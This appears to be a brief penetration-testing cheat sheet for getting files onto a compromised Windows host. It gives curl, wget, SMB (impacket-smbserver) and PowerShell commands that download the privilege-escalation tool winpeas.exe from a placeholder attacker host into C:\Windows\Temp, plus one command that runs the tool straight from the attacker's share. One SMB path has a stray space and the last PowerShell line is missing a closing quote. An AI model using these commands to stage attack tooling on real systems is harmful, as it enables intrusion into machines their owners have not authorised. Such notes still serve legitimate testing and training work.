# Transferring Files

### Transferring Files to a Windows Client

#### Curl

`curl http://[ATTACKER_IP]/winpeas.exe -o winpeas.exe`

#### wget&#x20;

`wget http://[ATTACKER_IP]/winpeas.exe -O winpeas.exe`

#### SMB

1. `impacket-smbserver parzival [TARGET_DIRECTORY]`
2. Validate the share is accessible: `net view [ATTACKER_IP]`
3. Copy the file to a local directory: `copy \\[ATTACKER_IP]\parzival\winpeas.exe`

#### Run the Executable Directly from SMB

`\\[ATTACKER_IP] \parzival\winpeas.exe`

#### Powershell

`(New-Object System.Net.WebClient).DownloadFile("http://[ATTACKER_IP]/winpeas.exe", "C:\Windows\Temp\winpeas.exe")`

`Invoke-WebRequest "http://[ATTACKER_IP]/winpeas.exe" -OutFile "C:\Windows\Temp\winpeas.exe"`

`powershell.exe -c "iwr http://[ATTACKER_IP]/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe`
